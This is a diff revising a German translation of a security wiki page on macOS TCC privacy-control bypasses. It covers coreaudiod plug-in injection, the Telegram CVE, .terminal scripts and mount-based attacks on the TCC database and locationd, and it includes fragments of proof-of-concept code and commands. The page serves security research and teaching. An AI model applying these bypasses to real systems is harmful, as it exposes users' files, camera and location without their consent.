-Das Binary **`/usr/sbin/coreaudiod`** verfügte über die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Das erste **ermöglichte code injection**, während das zweite Zugriff auf die **Verwaltung von TCC** gewährte.
+Das Binary **`/usr/sbin/coreaudiod`** besaß die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Das erste **ermöglichte code injection**, während das zweite Zugriff auf die **Verwaltung von TCC** gewährte.
 
-Dieses Binary erlaubte das Laden von **third party plug-ins** aus dem Ordner `/Library/Audio/Plug-Ins/HAL`. Daher war es möglich, mit diesem PoC **ein Plugin zu laden und die TCC-Berechtigungen zu missbrauchen**:<sup>[[13]](#references)</sup>
+Dieses Binary konnte **third-party plug-ins** aus dem Ordner `/Library/Audio/Plug-Ins/HAL` laden. Daher war es möglich, mit diesem PoC ein **plugin zu laden und die TCC-Berechtigungen zu missbrauchen**:<sup>[[13]](#references)</sup>
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -288,13 +288,13 @@ add_tcc_entry();
 NSLog(@"[+] Exploitation finished...");
 exit(0);
 ```
-Für weitere Informationen siehe den [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>
+Weitere Informationen finden Sie im [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>
 
 ### Device Abstraction Layer (DAL) Plug-Ins
 
-Systemanwendungen, die den Kamerastream über Core Media I/O öffnen (Anwendungen mit **`kTCCServiceCamera`**), laden diese Plugins in den Prozess. Sie befinden sich in `/Library/CoreMediaIO/Plug-Ins/DAL` (nicht durch SIP eingeschränkt).
+Systemanwendungen, die einen Kamerastream über Core Media I/O öffnen (Apps mit **`kTCCServiceCamera`**), laden diese im Prozess befindlichen Plug-ins aus `/Library/CoreMediaIO/Plug-Ins/DAL` (nicht durch SIP eingeschränkt).
 
-Das einfache Speichern einer Bibliothek mit dem üblichen **constructor** an diesem Ort reicht aus, um **Code zu injizieren**.
+Allein das Ablegen einer Bibliothek mit dem üblichen **constructor** an diesem Ort reicht aus, um **Code zu injizieren**.
 
 Mehrere Apple-Anwendungen waren dafür anfällig.
 
@@ -326,17 +326,17 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 </dict>
 </plist>
 ```
-Für weitere Informationen darüber, wie dies einfach ausgenutzt werden kann, [**siehe den original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>
+Weitere Informationen dazu, wie man dies einfach ausnutzen kann, findest du im [**original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>
 
 ### CVE-2020-10006
 
-Das Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` verfügte über die Entitlements **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, wodurch Code in den Prozess injiziert und die TCC-Berechtigungen genutzt werden konnten.
+Die Binärdatei `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` verfügte über die Entitlements **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, wodurch Code in den Prozess injiziert und die TCC-Rechte verwendet werden konnten.
 
 ### CVE-2023-26818 - Telegram
 
-Telegram verfügte über die Entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, sodass es möglich war, dies zu missbrauchen, um **Zugriff auf seine Berechtigungen zu erhalten**, beispielsweise zum Aufzeichnen mit der Kamera. Du kannst [**das Payload im writeup finden**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>
+Telegram verfügte über die Entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, sodass es möglich war, dies zu missbrauchen, um **Zugriff auf seine Berechtigungen zu erhalten**, beispielsweise für Aufnahmen mit der Kamera. Du kannst [**das Payload im writeup finden**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>
 
-Beachte, wie die Umgebungsvariable verwendet wurde, um eine Library zu laden: Es wurde ein **custom plist** erstellt, um diese Library zu injizieren, und **`launchctl`** wurde verwendet, um sie zu starten:<sup>[[15]](#references)</sup>
+Beachte, dass zur Verwendung der env variable zum Laden einer library ein **custom plist** erstellt wurde, um diese library zu injizieren, und **`launchctl`** zum Starten verwendet wurde:<sup>[[15]](#references)</sup>
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -372,7 +372,7 @@ Es ist möglich, **`open`** auch innerhalb einer Sandbox aufzurufen.
 
 ### Terminal Scripts
 
-Es ist ziemlich üblich, Terminal **Full Disk Access (FDA)** zu gewähren, zumindest auf Computern, die von technisch versierten Personen verwendet werden. Außerdem ist es möglich, damit **`.terminal`**-Skripte aufzurufen.
+Es ist ziemlich üblich, Terminal **Full Disk Access (FDA)** zu gewähren, zumindest auf Computern, die von technisch versierten Personen verwendet werden. Damit ist es möglich, **`.terminal`**-Skripte aufzurufen.
 
 **`.terminal`**-Skripte sind plist-Dateien wie diese, wobei der auszuführende Befehl im Schlüssel **`CommandString`** enthalten ist:
 ```xml
@@ -392,7 +392,7 @@ Es ist ziemlich üblich, Terminal **Full Disk Access (FDA)** zu gewähren, zumin
 </dict>
 </plist>
 ```
-Eine Anwendung könnte ein Terminal-Skript an einem Ort wie /tmp schreiben und es mit einem Befehl wie diesem starten:
+Eine Anwendung könnte ein Terminal-Skript an einem Ort wie /tmp schreiben und es mit einem Befehl wie folgt starten:
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -403,12 +403,12 @@ task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
 exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
-## Durch Mounten
+## Durch Einhängen
 
-### CVE-2020-9771 - mount_apfs TCC bypass und privilege escalation
+### CVE-2020-9771 – TCC-Bypass und Privilege Escalation durch mount_apfs
 
-**Jeder Benutzer** (auch Benutzer ohne privilegierte Rechte) kann einen Time-Machine-Snapshot erstellen und mounten und auf **ALLE Dateien** dieses Snapshots zugreifen.\
-Die **einzige erforderliche Berechtigung** besteht darin, dass die verwendete Anwendung (z. B. `Terminal`) über **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) verfügen muss; dieser Zugriff muss von einem Administrator gewährt werden.<sup>[[2]](#references)</sup>
+**Jeder Benutzer** (auch Benutzer ohne Privilegien) kann einen Time-Machine-Snapshot erstellen und einhängen und auf **ALLE Dateien** dieses Snapshots zugreifen.\
+Die **einzige erforderliche Berechtigung** besteht darin, dass die verwendete Anwendung (wie `Terminal`) über **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) verfügen muss, der von einem Administrator gewährt werden muss.<sup>[[2]](#references)</sup>
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -428,11 +428,11 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Eine ausführlichere Erklärung ist im [**ursprünglichen Bericht zu finden**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>
+Eine ausführlichere Erklärung ist im [**Originalbericht zu finden**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>
 
 ### CVE-2021-1784 & CVE-2021-30808 - Mount über TCC-Datei
 
-Selbst wenn die TCC-DB-Datei geschützt war, war es möglich, **über das Verzeichnis** eine neue TCC.db-Datei zu mounten:
+Auch wenn die TCC-DB-Datei geschützt ist, war es möglich, **ein neues TCC.db über das Verzeichnis zu mounten**:
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
@@ -453,7 +453,7 @@ os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
 os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
 os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
-Prüfe den **vollständigen Exploit** im [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>
+Überprüfe den **vollständigen Exploit** im [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>
 
 ### CVE-2024-40855
 
@@ -461,25 +461,25 @@ Wie im [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) er
 
 Die Funktion `DADiskMountWithArgumentsCommon` aus dem öffentlichen `DiskArbitration`-Framework führte die Sicherheitsprüfungen durch. Es ist jedoch möglich, diese zu umgehen, indem `diskarbitrationd` direkt aufgerufen wird und dadurch `../`-Elemente im Pfad sowie Symlinks verwendet werden.
 
-Dies ermöglichte es einem Angreifer, beliebige Mounts an jedem Ort durchzuführen, auch über der TCC-Datenbank, da `diskarbitrationd` über das Entitlement `com.apple.private.security.storage-exempt.heritable` verfügt.
+Dies ermöglichte es einem Angreifer, beliebige Mounts an jedem Ort durchzuführen, einschließlich über der TCC-Datenbank, da `diskarbitrationd` über das Entitlement `com.apple.private.security.storage-exempt.heritable` verfügt.
 
 ### asr
 
-Das Tool **`/usr/sbin/asr`** ermöglichte es, die gesamte Festplatte zu kopieren und sie an einem anderen Ort zu mounten, wodurch die TCC-Schutzmechanismen umgangen wurden.
+Das Tool **`/usr/sbin/asr`** ermöglichte es, die gesamte Festplatte zu kopieren und sie an einem anderen Ort zu mounten, wodurch TCC-Schutzmechanismen umgangen wurden.
 
 ### CVE-2022-22655 - Location Services
 
-Location Services werden **nicht** wie die anderen Services in einer TCC-Datenbank gespeichert. Sie werden von `locationd` verwaltet, das seine eigene Allow-Liste in **`/var/db/locationd/clients.plist`** führt:<sup>[[4]](#references)</sup>
+Location Services werden **nicht** wie die anderen Services in einer TCC-Datenbank gespeichert. Sie werden von `locationd` verwaltet, das seine eigene Allow-Liste unter **`/var/db/locationd/clients.plist`** führt:<sup>[[4]](#references)</sup>
 ```bash
 # Requires FDA to read
 sudo plutil -p /var/db/locationd/clients.plist | head -40
 ```
-Jeder Eintrag ist nach dem Client (Bundle ID oder ausführbarer Pfad) benannt und enthält Felder wie `Authorized`, `BundleId`, `Executable` und `Registered`.<sup>[[4]](#references)</sup>
+Jeder Eintrag ist nach dem Client (Bundle ID oder ausführbarer Pfad) indiziert und enthält Felder wie `Authorized`, `BundleId`, `Executable` und `Registered`.<sup>[[4]](#references)</sup>
 
-Die Datei `clients.plist` selbst ist durch Sandbox/TCC geschützt und kann nicht einmal als root bearbeitet werden – das Verzeichnis **`/var/db/locationd/` war jedoch nicht vor dem Mounten geschützt**. Ein als root ausgeführter Angreifer konnte daher ein Disk-Image mit einer eigenen `clients.plist` erstellen (in der das eigene Binary als `Authorized` markiert war), dieses über das Verzeichnis mounten und `locationd` neu starten, damit die gefälschte Allow-List wirksam wurde.<sup>[[3]](#references)</sup>
+Die Datei `clients.plist` selbst ist durch Sandbox/TCC geschützt und kann nicht einmal als root bearbeitet werden — das Verzeichnis **`/var/db/locationd/` war jedoch nicht vor dem Mounten geschützt**. Ein als root ausgeführter Angreifer konnte daher ein Disk-Image mit einer eigenen `clients.plist` erstellen (in der die eigene Binary als `Authorized` markiert war), es über das Verzeichnis mounten und `locationd` neu starten, damit die gefälschte Allow-List wirksam wurde.<sup>[[3]](#references)</sup>
 
 > [!TIP]
-> Dies entspricht demselben Muster wie bei den oben genannten `hdiutil`/`mount`-TCC-bypasses: Die *Datei* ist geschützt, das *Verzeichnis*, in dem sie liegt, jedoch nicht. Daher ersetzt man das gesamte Verzeichnis anstelle der Datei.
+> Dies entspricht demselben Muster wie bei den obigen `hdiutil`/`mount`-TCC-bypasses: Die *Datei* ist geschützt, das *Verzeichnis, in dem sie liegt*, jedoch nicht. Daher ersetzt man das gesamte Verzeichnis statt die Datei.
 
 ## Über Startup-Apps
 
@@ -490,44 +490,43 @@ Die Datei `clients.plist` selbst ist durch Sandbox/TCC geschützt und kann nicht
 
 ## Über grep
 
-In mehreren Fällen speichern Dateien sensible Informationen wie E-Mail-Adressen, Telefonnummern, Nachrichten ... an nicht geschützten Orten (was bei Apple als Schwachstelle gilt).
+Bei mehreren Gelegenheiten speichern Dateien sensible Informationen wie E-Mail-Adressen, Telefonnummern, Nachrichten ... an nicht geschützten Speicherorten (was bei Apple als Schwachstelle gilt).
 
 <figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>
 
-## Synthetische Klicks
+## Synthetic Clicks
 
-Dies funktioniert nicht mehr, hat aber [**in der Vergangenheit funktioniert**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**
+Dies funktioniert nicht mehr, war aber [**in der Vergangenheit möglich**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**
 
 <figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>
 
-Eine weitere Möglichkeit unter Verwendung von [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>
+Eine weitere Methode mit [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>
 
 <figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>
 
 ## References
 
-- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
-- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
-- [3] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
-- [4] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
-- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
-- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
-- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
-- [8] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
-- [9] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
-- [10] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
-- [11] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
-- [12] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
-- [13] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
-- [14] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
-- [15] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
-- [16] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
+- [1] [CVE-2020–9934: Umgehen des macOS-Frameworks Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
+- [2] [macOS-TCC-Benutzer-Datenschutz durch Zufall und Design umgehen](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
+- [3] [CVE-2022-22655 - Umgehung der TCC Location Services (Originalbericht)](https://theevilbit.github.io/posts/cve-2022-22655/)
+- [4] [Wo auf der Welt ist Carmen Sandiego: Location Services unter macOS missbrauchen](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
+- [5] [Jamf Threat Labs - CVE-2024-44131: TCC-bypass stiehlt Daten aus iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
+- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG-Umgebungsvariablen)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
+- [7] [Apple - Allow-DYLD-environment-variables-Entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
+- [8] [The Eclectic Light Company - Notarisierung: die Hardened Runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
+- [9] [Zero-Day-TCC-bypass in der XCSSET-Malware entdeckt](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
+- [10] [OBTS v5.0: „Was auf deinem Mac passiert, bleibt in Apples iCloud?!“ - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+- [11] [Neue macOS-Schwachstelle „powerdir“ könnte zu unbefugtem Zugriff auf Benutzerdaten führen](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
+- [12] [Home-Verzeichnis ändern und TCC umgehen, auch bekannt als CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
+- [13] [Musik abspielen und TCC umgehen, auch bekannt als CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
+- [14] [Wie man einen (Fire)fox ausraubt](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
+- [15] [CVE-2023-26818 - TCC mit Telegram unter macOS umgehen](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+- [16] [Kandji - Aufdecken von Apple-Schwachstellen: Audit von diskarbitrationd und storagekitd, Teil 2](https://www.kandji.io/blog/macos-audit-story-part2)
 - [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
 - [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
-- [19] [Stack Overflow - Setting environment variables on OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
-- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass and privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
-- [21] [theevilbit - CVE-2021-30808: TCC bypass by mounting over the TCC database](https://theevilbit.github.io/posts/cve-2021-30808/)
-- [22] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
-- [23] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
-
+- [19] [Stack Overflow - Umgebungsvariablen unter OS X setzen](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
+- [20] [theevilbit - CVE-2020-9771: mount_apfs-TCC-bypass und Privilege Escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
+- [21] [theevilbit - CVE-2021-30808: TCC-bypass durch Mounten über der TCC-Datenbank](https://theevilbit.github.io/posts/cve-2021-30808/)
+- [22] [20+ Möglichkeiten, deine macOS-Datenschutzmechanismen zu umgehen](https://www.youtube.com/watch?v=W9GxnP8c8FU)
+- [23] [Knockout-Sieg gegen TCC - 20+ NEUE Möglichkeiten, deine macOS-Datenschutzmechanismen zu umgehen](https://www.youtube.com/watch?v=a9hsxPdRxsY)
 {{#include ../../../../../banners/hacktricks-training.md}}
